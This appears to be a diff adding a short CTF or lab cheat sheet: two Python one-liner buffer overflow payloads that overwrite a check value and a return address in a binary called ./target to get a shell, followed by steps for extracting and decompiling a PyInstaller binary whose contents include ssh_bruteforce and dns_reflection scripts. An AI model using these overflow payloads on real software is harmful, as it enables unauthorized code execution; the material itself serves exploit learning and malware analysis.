@@ -1,0 +1,34 @@
+# buffer=40, fgets=45, check=0xdeadbeef  (cat is for keeping shell open)
+python -c "print 'A' * 40 + '\xef\xbe\xad\xde'; cat" | ./target )
+
+# buffer=128, fgets=133, `print shell` in gdb, the rest is history
+(python2 -c 'print "A"*128 + "\x16\x85\x04\x08"'; cat -) | ./target
+
+
+
+
+
+# REVERSE ENGINEER PyInstaller
+# Determine compile library
+strings attack_a | grep -i 'PyInstaller\|pyi\|PYZ'
+
+# Download pyinstxtractor
+wget https://github.com/extremecoders-re/pyinstxtractor/archive/refs/heads/master.zip
+unzip master.zip
+
+# Run the extractor on your binary
+python3 pyinstxtractor-master/pyinstxtractor.py attack_a
+
+# Extract the magic number to identify Python version
+xxd -l 4 ssh_bruteforce.pyc
+
+## PYTHON VERSION DEPENDENT TOOL
+# Locate the Python Bytecode (.pyc)
+decompyle3 attack_a_extracted/ssh_bruteforce.pyc > ssh_bruteforce_decompiled.py
+
+## PYTHON VERSION INDEPENDENT (C++)
+git clone https://github.com/zrax/pycdc
+cd pycdc
+cmake .
+make
+./pycdc /full/path/to/dns_reflection.pyc > ../dns_reflection.py
